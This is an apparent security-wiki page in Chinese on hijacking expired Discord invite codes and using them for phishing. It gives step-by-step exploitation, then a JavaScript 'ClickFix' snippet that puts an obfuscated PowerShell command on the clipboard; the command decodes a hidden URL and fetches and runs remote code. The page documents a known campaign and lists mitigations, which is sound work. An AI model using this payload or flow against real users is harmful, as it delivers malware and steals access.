# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord 的邀请系统漏洞允许 threat actors 将已过期或已删除的邀请代码（临时、永久或 custom vanity）注册为任意 Level 3 boosted server 上的新 vanity links。由于所有代码都会被规范化为小写，攻击者可以预先注册已知的邀请代码，并在原始链接过期或源服务器失去 boost 后，静默 hijack 流量。<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 过期后，该代码会变为可用状态，并可由 boosted server 重新注册为 vanity URL。 |
| Permanent Invite Link | ⚠️          | 如果被删除且仅由小写字母和数字组成，该代码可能会再次变为可用状态。        |
| Custom Vanity Link    | ✅          | 如果原始服务器失去其 Level 3 Boost，其 vanity invite 将变为可供新注册的状态。    |

## Exploitation Steps

1. Reconnaissance
- 监控公开来源（论坛、社交媒体、Telegram channels）中符合 `discord.gg/{code}` 或 `discord.com/invite/{code}` 模式的邀请链接。<sup>[[1]](#references)</sup>
- 收集感兴趣的邀请代码（临时或 vanity）。
2. Pre-registration
- 创建或使用一个已有 Level 3 Boost 权限的 Discord 服务器。
- 在 **Server Settings → Vanity URL** 中，尝试分配目标邀请代码。如果被接受，该代码就会被恶意服务器保留。
3. Hijack Activation
- 对于临时邀请，等待原始邀请过期（如果你控制源服务器，也可以手动将其删除）。
- 对于包含大写字母的代码，可以立即 claim 其小写变体，但重定向只会在过期后激活。
4. Silent Redirection
- hijack 生效后，访问旧链接的用户会被无缝发送到攻击者控制的服务器。

## Phishing Flow via Discord Server

1. 限制服务器频道，使用户只能看到 **#verify** 频道。<sup>[[1]](#references)</sup>
2. 部署一个 bot（例如 **Safeguard#0786**），提示新用户通过 OAuth2 进行验证。
3. Bot 将用户重定向到 phishing site（例如 `captchaguard.me`），伪装成 CAPTCHA 或验证步骤。
4. 实施 **ClickFix** UX trick：
- 显示一条损坏的 CAPTCHA 消息。
- 引导用户打开 **Win+R** 对话框，粘贴预加载的 PowerShell command，然后按 Enter。

### ClickFix Clipboard Injection Example
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
这种方法避免了直接下载文件，并利用用户熟悉的 UI 元素来降低其怀疑程度。<sup>[[1]](#references)</sup>

## 缓解措施

- 使用至少包含一个大写字母或非字母数字字符的永久邀请链接（永不过期且不可重复使用）。<sup>[[1]](#references)</sup>
- 定期轮换邀请代码并撤销旧链接。
- 监控 Discord 服务器 boost 状态和 vanity URL 申请情况。
- 教育用户验证服务器真实性，避免执行从剪贴板粘贴的命令。

## 参考资料

- [1] [从信任到威胁：被劫持的 Discord 邀请链接被用于多阶段 Malware 投递](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [自定义邀请链接 – Discord 支持](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
